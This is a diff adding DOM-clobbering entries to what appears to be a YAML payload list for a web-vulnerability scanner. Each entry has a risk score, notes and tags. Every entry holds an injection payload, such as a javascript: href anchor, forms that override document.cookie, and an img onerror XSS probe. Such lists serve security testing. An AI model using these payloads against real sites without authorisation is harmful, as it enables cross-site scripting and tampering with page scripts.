@@ -1800,3 +1800,46 @@ payloads:
     payload: "<img src=x onerror=alert('ws')>"
     notes: "DOM XSS via WebSocket message handler. If ws.onmessage inserts event.data into innerHTML."
     tags: [dom, websocket, onmessage, innerhtml]
+
+  # ============================================================
+  # DOM CLOBBERING
+  # ============================================================
+  - technique: dom_clobbering
+    injection_surface: query
+    evidence_type: dom_execution
+    risk: 2
+    payload: "<form id=x><input name=y value=clobbered></form>"
+    notes: "DOM clobbering — creates form element accessible via document.x.y.value. May override JS variables."
+    tags: [dom, clobbering, form, input]
+
+  - technique: dom_clobbering
+    injection_surface: query
+    evidence_type: dom_execution
+    risk: 2
+    payload: "<a id=x href=javascript:alert(1)>"
+    notes: "DOM clobbering — anchor element clobbers document.x. toString() returns href value."
+    tags: [dom, clobbering, anchor, href]
+
+  - technique: dom_clobbering
+    injection_surface: query
+    evidence_type: dom_execution
+    risk: 2
+    payload: "<img id=x name=y src=1>"
+    notes: "DOM clobbering — img element clobbers document.x and document.y. May bypass JS security checks."
+    tags: [dom, clobbering, img, named]
+
+  - technique: dom_clobbering
+    injection_surface: query
+    evidence_type: dom_execution
+    risk: 2
+    payload: "<form id=document><input name=cookie value=clobbered></form>"
+    notes: "DOM clobbering — clobbers document.cookie reference. Breaks JS that reads document.cookie."
+    tags: [dom, clobbering, document_cookie]
+
+  - technique: dom_clobbering
+    injection_surface: query
+    evidence_type: dom_execution
+    risk: 2
+    payload: "<a id=x><a id=x name=y href=cid:clobbered>"
+    notes: "DOM clobbering — HTMLCollection via duplicate IDs. document.x returns collection, x.y resolves via named item."
+    tags: [dom, clobbering, collection, duplicate_id]
